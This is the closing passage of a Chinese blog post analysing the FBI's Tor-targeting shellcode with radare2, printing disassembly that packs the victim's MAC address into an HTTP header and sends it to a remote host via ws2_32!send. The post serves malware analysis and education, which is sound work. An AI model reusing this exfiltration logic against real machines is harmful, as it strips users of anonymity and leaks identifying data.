|          <span class="number">0x0000020d</span>    <span class="number">59</span>           pop ecx
</code></pre><p>后来看看原来如此</p>
<pre><code>In [<span class="number">9</span>]: chr(<span class="number">10</span>+<span class="number">0x37</span>)
Out[<span class="number">9</span>]: <span class="string">'A'</span>

In [<span class="number">10</span>]: chr(<span class="number">9</span>+<span class="number">0x30</span>)
Out[<span class="number">10</span>]: <span class="string">'9'</span>
</code></pre><p>原来是把mac地址转换成可打印字符。</p>
<p>下一步，估计就是放进http报头中发送了。</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x0000020d</span>
|          <span class="number">0x0000020d</span>    <span class="number">59</span>           <span class="keyword">pop</span> <span class="literal">ecx</span>
|          <span class="number">0x0000020e</span>    29cf         <span class="keyword">sub</span> <span class="literal">edi</span>, <span class="literal">ecx</span>
|          <span class="number">0x00000210</span>    89fe         <span class="keyword">mov</span> <span class="literal">esi</span>, <span class="literal">edi</span>
|          <span class="number">0x00000212</span>    <span class="number">58</span>           <span class="keyword">pop</span> <span class="literal">eax</span>
|          <span class="number">0x00000213</span>    01c4         <span class="keyword">add</span> <span class="literal">esp</span>, <span class="literal">eax</span>
|          <span class="number">0x00000215</span>    8bbd4b020000 <span class="keyword">mov</span> <span class="literal">edi</span>, [<span class="literal">ebp</span>+<span class="number">0x24b</span>]
|          <span class="number">0x0000021b</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
|          <span class="number">0x0000021d</span>    c6854f02000. <span class="keyword">mov</span> <span class="preprocessor">byte</span> [<span class="literal">ebp</span>+<span class="number">0x24f</span>], <span class="number">0x1</span> <span class="comment">;  0x00000001 </span>
|          <span class="number">0x00000224</span>    e82e000000   <span class="keyword">call</span> <span class="number">0x257</span> <span class="comment">; (fcn.00000252)</span>
|             fcn<span class="string">.00000252</span>()
|          <span class="number">0x00000229</span>    31c0         <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
</code></pre><p>果然是，调用<code>0x257</code>拼接报头。</p>
<p>之后，</p>
<pre><code>[<span class="number">0x00000252</span>]&gt; pd <span class="number">10</span>@<span class="number">0x00000229</span>
|          <span class="number">0x00000229</span>    <span class="number">31</span>c0         xor eax, eax
|          <span class="number">0x0000022b</span>    <span class="number">50</span>           push eax
|          <span class="number">0x0000022c</span>    <span class="number">51</span>           push ecx
|          <span class="number">0x0000022d</span>    <span class="number">29</span>cf         sub edi, ecx
|          <span class="number">0x0000022f</span>    <span class="number">4f</span>           dec edi
|          <span class="number">0x00000230</span>    <span class="number">57</span>           push edi
|          <span class="number">0x00000231</span>    <span class="number">53</span>           push ebx
|          <span class="number">0x00000232</span>    <span class="number">68</span>c2eb385f   push <span class="number">0x5f38ebc2</span> ;  ws2_32!send 
|          <span class="number">0x00000237</span>    ffd5         call ebp
|             fcn<span class="number">.00000000</span>(unk, unk, unk, unk, unk)
|          ; JMP XREF from <span class="number">0x00000141</span> (fcn<span class="number">.00000090</span>)
|          ; JMP XREF from <span class="number">0x00000189</span> (fcn<span class="number">.00000090</span>)
|          ; JMP XREF from <span class="number">0x00000197</span> (fcn<span class="number">.00000090</span>)
|          ; JMP XREF from <span class="number">0x000001cb</span> (fcn<span class="number">.00000090</span>)
|          ;-- closesocket:
|          <span class="number">0x00000239</span>    <span class="number">53</span>           push ebx
</code></pre><p>显然将报头send出去了。</p>
<p>最后，关闭socket连接。然后跳回<code>0x10e</code>构造报头然后崩溃……</p>
<pre><code>[<span class="number">0x00000252</span>]&gt; pd <span class="number">10</span>@<span class="number">0x00000239</span>
|      |   ; JMP XREF from <span class="number">0x00000141</span> (fcn<span class="number">.00000090</span>)
|      |   ; JMP XREF from <span class="number">0x00000189</span> (fcn<span class="number">.00000090</span>)
|      |   ; JMP XREF from <span class="number">0x00000197</span> (fcn<span class="number">.00000090</span>)
|      |   ; JMP XREF from <span class="number">0x000001cb</span> (fcn<span class="number">.00000090</span>)
|      |   ;-- closesocket:
|      |   <span class="number">0x00000239</span>    <span class="number">53</span>           push ebx
|      |   <span class="number">0x0000023a</span>    <span class="number">68756e4</span>d61   push <span class="number">0x614d6e75</span> ;  <span class="number">0x614d6e75</span> 
|      |   <span class="number">0x0000023f</span>    ffd5         call ebp
|      |      fcn<span class="number">.00000000</span>(unk, unk, unk)
\      `=&lt; <span class="number">0x00000241</span>    e9c8feffff   jmp <span class="number">0x10e</span> ; (fcn<span class="number">.00000090</span>)
</code></pre><p>至此这个shellcode大致做了什么就比较清晰了。与远程主机建立连接，将计算机的机器名获取，又获取IP地址和MAC地址，然后构造HTTP报头发送给远端的机器。</p>
<p>要更加清晰的知道shellcode在干什么，最好还是动态方式调试下。当然得写个测试shellcode的程序了，好像radare2有调试功能……不会用，唉，标记都用不好。</p>
</span>
      
    </div>

    <footer class="post-footer">
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/exploit/2014/08/08/defeating-ioli-with-radare2/" rel="next" title="Defeating ioli with radare2">
                <i class="fa fa-chevron-left"></i> Defeating ioli with radare2
              </a>
            
          </div>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/life/2014/08/26/" rel="prev" title="希望">
                希望 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>


        </div>

        


        
  <div class="comments" id="comments">
    
      <div id="disqus_thread">
        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
      </div>
    
  </div>


      </div>

      
        
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Liu Yuyang" itemprop="image"/>
          <p class="site-author-name" itemprop="name">Liu Yuyang</p>
        </div>
        <p class="site-description motion-element" itemprop="description">我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">167</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            
              <span class="site-state-item-count">23</span>
              <span class="site-state-item-name">分类</span>
              
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">57</span>
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/reverland" target="_blank">
                  
                    <i class="fa fa-github"></i> GitHub
                  
                </a>
              </span>
            
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
        </div>

      </section>

      
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc-indicator-top post-toc-indicator">
            <i class="fa fa-angle-double-up"></i>
          </div>
          <div class="post-toc">
            
              
            
            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#逆向之"><span class="nav-number">1.</span> <span class="nav-text">逆向之</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞挖掘程序"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞挖掘程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#位置独立代码"><span class="nav-number">1.2.</span> <span class="nav-text">位置独立代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#定位Windows_API"><span class="nav-number">1.3.</span> <span class="nav-text">定位Windows API</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开始"><span class="nav-number">2.</span> <span class="nav-text">开始</span></a></li></ol></div>
            
          </div>
          <div class="post-toc-indicator-bottom post-toc-indicator">
            <i class="fa fa-angle-double-down"></i>
          </div>
        </section>
      

    </div>
  </aside>


      
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2011 - 
  <span itemprop="copyrightYear">2015</span>
  <span class="with-love">
    <i class="icon-next-heart fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Liu Yuyang</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT
  </a>
</div>



      </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  

  
    
    

  

    <script type="text/javascript">
      var disqus_shortname = 'reverlandblog';
      var disqus_identifier = 'uncategorized/2014/08/14/fbi-tor-malware-analysis/';
      var disqus_title = 'FBI Tor Malware analysis(意译整理)';
      var disqus_url = 'http://reverland.org/uncategorized/2014/08/14/fbi-tor-malware-analysis/';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
        run_disqus_script('embed.js');
      
    </script>
  


  

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>


  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  
<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.2" id="bootstrap.scrollspy.custom"></script>


<script type="text/javascript" id="sidebar.toc.highlight">
  $(document).ready(function () {
    var tocSelector = '.post-toc';
    var $tocSelector = $(tocSelector);
    var activeCurrentSelector = '.active-current';

    $tocSelector
      .on('activate.bs.scrollspy', function () {
        var $currentActiveElement = $(tocSelector + ' .active').last();

        removeCurrentActiveClass();
        $currentActiveElement.addClass('active-current');

        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
      })
      .on('clear.bs.scrollspy', function () {
        removeCurrentActiveClass();
      });

    function removeCurrentActiveClass () {
      $(tocSelector + ' ' + activeCurrentSelector)
        .removeClass(activeCurrentSelector.substring(1));
    }

    function processTOC () {
      getTOCMaxHeight();
      toggleTOCOverflowIndicators();
    }

    function getTOCMaxHeight () {
      var height = $('.sidebar').height() -
                   $tocSelector.position().top -
                   $('.post-toc-indicator-bottom').height();

      $tocSelector.css('height', height);

      return height;
    }

    function toggleTOCOverflowIndicators () {
      tocOverflowIndicator(
        '.post-toc-indicator-top',
        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
      );

      tocOverflowIndicator(
        '.post-toc-indicator-bottom',
        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
      )
    }

    $(document).on('sidebar.motion.complete', function () {
      processTOC();
    });

    $('body').scrollspy({ target: tocSelector });
    $(window).on('resize', function () {
      if ( $('.sidebar').hasClass('sidebar-active') ) {
        processTOC();
      }
    });

    onScroll($tocSelector);

    function onScroll (element) {
      element.on('mousewheel DOMMouseScroll', function (event) {
          var oe = event.originalEvent;
          var delta = oe.wheelDelta || -oe.detail;

          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
          event.preventDefault();

          toggleTOCOverflowIndicators();
      });
    }

    function tocOverflowIndicator (indicator, action) {
      var $indicator = $(indicator);
      var opacity = action === 'show' ? 1 : 0;
      $indicator.velocity ?
        $indicator.velocity('stop').velocity({
          opacity: opacity
        }, { duration: 100 }) :
        $indicator.stop().animate({
          opacity: opacity
        }, 100);
    }

  });
</script>

<script type="text/javascript" id="sidebar.nav">
  $(document).ready(function () {
    var html = $('html');
    var TAB_ANIMATE_DURATION = 200;
    var hasVelocity = $.isFunction(html.velocity);

    $('.sidebar-nav li').on('click', function () {
      var item = $(this);
      var activeTabClassName = 'sidebar-nav-active';
      var activePanelClassName = 'sidebar-panel-active';
      if (item.hasClass(activeTabClassName)) {
        return;
      }

      var currentTarget = $('.' + activePanelClassName);
      var target = $('.' + item.data('target'));

      hasVelocity ?
        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
          target
            .velocity('stop')
            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
            .addClass(activePanelClassName);
        }) :
        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
          currentTarget.hide();
          target
            .stop()
            .css({'opacity': 0, 'display': 'block'})
            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
              currentTarget.removeClass(activePanelClassName);
              target.addClass(activePanelClassName);
            });
        });

      item.siblings().removeClass(activeTabClassName);
      item.addClass(activeTabClassName);
    });

    $('.post-toc a').on('click', function (e) {
      e.preventDefault();
      var targetSelector = escapeSelector(this.getAttribute('href'));
      var offset = $(targetSelector).offset().top;
      hasVelocity ?
        html.velocity('stop').velocity('scroll', {
          offset: offset  + 'px',
          mobileHA: false
        }) :
        $('html, body').stop().animate({
          scrollTop: offset
        }, 500);
    });

    // Expand sidebar on post detail page by default, when post has a toc.
    motionMiddleWares.sidebar = function () {
      var $tocContent = $('.post-toc-content');
      if (CONFIG.sidebar === 'post') {
        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
          displaySidebar();
        }
      }
    };
  });
</script>



  <script type="text/javascript" src="/js/bootstrap.js"></script>

  
  

  
  

</body>
</html>
